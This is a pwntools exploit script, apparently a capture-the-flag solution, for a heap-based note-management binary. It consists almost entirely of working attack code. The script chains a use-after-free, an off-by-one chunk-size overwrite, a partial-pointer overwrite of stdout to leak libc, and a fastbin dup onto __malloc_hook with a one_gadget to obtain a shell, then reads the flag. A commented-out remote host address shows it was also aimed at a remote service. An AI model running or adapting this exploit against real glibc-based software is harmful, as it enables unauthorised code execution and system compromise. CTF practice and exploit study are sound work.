from pwn import*
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
p=process("./vuln") #p = remote("121.40.199.143",32861)
libc = ELF("./libc-2.23.so")
context.binary = libc

def add_page():
    p.sendlineafter(">","1")
    
def delete_page(page):
    p.sendlineafter(">","2")
    p.sendlineafter(">",str(page))

def add_note(page,size,content):
    p.sendlineafter(">","3")
    p.sendlineafter(">",str(page))
    p.sendlineafter(">",str(size))
    p.sendafter(">",content)
    
def delete_note(page,note):
    p.sendlineafter(">","4")
    p.sendlineafter(">",str(page))
    p.sendlineafter(">",str(note))
    
def bpt():
    if not args.REMOTE:
        gdb.attach(p)
    pause()
    
one_gadget = [0xf0897,0xef9f4,0x4525a,0x45206]
while True:
    try:
        #UAF
        add_note(0,0x28,b'a')   # 1
        add_note(0,0x28,b'a')   # 2
        add_note(0,0x28,b'a')   # 3
        add_note(0,0x28,b'a')   # 4
        add_note(0,0x28,b'a')   # 5
        delete_note(0,1)
        delete_note(0,2)
        delete_note(0,3)
        delete_note(0,4) # 0x30 * 8 in fastbin
        
        add_note(0,0x18,b'6')
        add_note(0,0xf8,b'7')
        add_note(0,0x68,b'8')
        add_note(0,0x68,b'9')
        add_note(0,0x18,b'10') # 0x30*3 in fastbin

        delete_note(0,6)
        add_note(0,0x18,b'a'*0x18+b'\xe1')  #0xb
        delete_note(0,7)                    # insert unsorted bin an 0x1e0 chunk
        delete_note(0,8)                    # put the overlapped chunk(0x70) into fastbin
        
        add_note(0,0xd8,b'b')               #0xc, split the chunk(0x1e0) by 0xe0, the remainder size is 0x100
        add_note(0,0x18,b'a')               #0xd, split the remainder chunk by 0x20, left 0xe0
        add_note(0,0x18,b'\xdd\x45')        #0xe, split the remainder chunk by 0x20, left 0xc0
                                            #     modify the residual fd in fastbin chunk(0x70)
                                            
        delete_note(0,13)
        bpt()
        add_note(0,0x18,p64(0)*3+b'\x71')   #0xf, change the unsorted bin chunk(0xc0)'s size to 0x70
        add_note(0,0x68,b'a')               #0x10
        add_note(0,0x68,b'a'*0x33+p64(0xfbad1800)+p64(0)*3+b'\x58') #0x11
        break
    except:
        p.close()
        continue

lbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))- libc.sym["_IO_2_1_stderr_"]- 0x163
success("-----------libc_base:",hex(lbase))
malloc_hook = lbase+libc.sym['__malloc_hook']
og = one_gadget[0]+lbase #fastbin dup

add_page()
add_note(1,0x28,b'1')
add_note(1,0x28,b'2')
add_note(1,0x28,b'3')
add_note(1,0x28,b'4')
add_note(1,0x28,b'5')
delete_note(1,1)
delete_note(1,2)
delete_note(1,3)
delete_note(1,4)        # now we have 0x30 * 8 in fastbin

add_note(1,0x18,b'6')
add_note(1,0xf8,b'7')
add_note(1,0x68,b'8')
add_note(1,0x68,b'9')
add_note(1,0x18,b'10')  # now fastbin still has chunk(0x30)*3

delete_note(1,6)
add_note(1,0x18,b'a'*0x18+b'\xe1')  #0xb, extend chunk_7 to 0x1e0
delete_note(1,7)                    # free chunk_7, get an unsortedbin chunk(0x1e0)
delete_note(1,8)                    # put the overlapped chunk_8(0x70) into fastbin
add_note(1,0xd8,b'b')               #0xc, split chunk(0x1e0) by 0xe0, the remainder size is 0x100s
add_note(1,0x18,b'a')               #0xd, split the remainder chunk by 0x20, left 0xe0

add_note(1,0x18,p64(malloc_hook-0x23)) #0xe, fastbin-dup
delete_note(1,13)
add_note(0,0x18,p64(0)*3+b'\x71')   #0xf, restore the chunk_7's size to 0x70, which has been in fastbin(0x70)
add_note(0,0x68,b'a')               #0x10
add_note(0,0x68,b'a'*0x13+p64(og))  #0x11
add_page()
p.sendline('cat flag')
'''
0x45206 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL
0x4525a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL
0xef9f4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL
0xf0897 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
p.interactive()